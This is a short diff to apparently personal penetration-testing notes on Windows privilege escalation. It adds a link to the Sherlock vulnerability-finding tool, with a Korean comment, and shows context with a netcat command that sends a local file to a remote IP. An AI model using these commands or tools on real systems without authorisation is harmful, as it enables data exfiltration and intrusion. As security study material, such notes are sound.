@@ -1,4 +1,13 @@
-# Windows Privilege Escalation
+<details>
+ <summary><strong>Sherlock</strong></summary>
+
+- https://github.com/rasta-mouse/Sherlock
+- 예전 버전 윈도우 취약점 발견.
+
+</details>
+
+---
+
 ## use nc to transfer files
 ```powershell
 nc 10.10.10.10 80 < file.txt
